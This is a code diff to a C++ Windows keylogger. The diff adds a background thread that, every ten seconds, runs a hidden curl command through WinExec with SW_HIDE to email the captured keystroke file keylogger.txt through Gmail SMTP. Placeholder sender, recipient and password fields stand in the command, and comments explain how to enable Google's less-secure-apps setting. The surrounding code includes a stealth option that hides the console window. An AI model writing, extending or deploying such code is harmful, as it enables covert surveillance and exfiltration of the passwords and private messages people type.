@@ -8,6 +8,9 @@
 #include <fstream>
 #include <sstream>
 #include <iostream>
+#include <chrono>
+#include <thread>
+
 
 /*
 LOG_MODE:
@@ -22,12 +25,24 @@ STEALTH:
 */
 #define STEALTH 0
 
+
+/*
+MAIL_INTERVAL
+defines the time interval in milliseconds in which mail should be send
+*/
+#define MAIL_INTERVAL 10000
+
 #if LOG_MODE == 1
 std::ofstream log_file;
 #endif
 
 //name of previous active forground window
 std::string prev_fg_win;
+
+//previous time mail was sent
+std::chrono::_V2::steady_clock::time_point prev_mail_time;
+
+
 
 const std::map<int, std::string> keyname{ 
 	{VK_CAPITAL, "<CAPSLOCK>" },
@@ -188,9 +203,43 @@ void Stealth()
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
 }
 
+/*
+sends mail at regular time interval
+using curl
+*/
+void sendMail(){
+    
+    //go to below link and allow less secure apps to authenticate
+    //https://www.google.com/settings/security/lesssecureapps
+
+    unsigned long long diff = 0;
+    while(true){
+        auto now = std::chrono::steady_clock::now();
+        diff = std::chrono::duration_cast<std::chrono::milliseconds>(now - prev_mail_time).count();
+        
+        if(diff > MAIL_INTERVAL){
+            
+            //go to below link and allow less secure apps to authenticate
+            //https://www.google.com/settings/security/lesssecureapps
+            
+            char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"SENDER.EMAIL@gmail.com\" --mail-rcpt \"RECIVER.EMAIL@gmail.com\" --ssl -u SENDER.EMAIL@gmail.com:PASSWORD -T \"keylogger.txt\" -k --anyauth";
+            WinExec(command, SW_HIDE); 
+            std::cout<<"send mail"<<std::endl; 
+            prev_mail_time = now; 
+        }
+        
+        
+    }
+    
+}
+
 
 int main(){
+    std::cout<<"ok"<<std::endl;
+    std::thread mail_thread(sendMail);
 
+    //initialize prev time
+    prev_mail_time = std::chrono::steady_clock::now();
 
     #if LOG_MODE == 1
     const char* log_filename = "keylogger.txt";
@@ -233,5 +282,7 @@ int main(){
     #if LOG_MODE == 1
     log_file.close();
     #endif
+
+    mail_thread.join();
 
 }
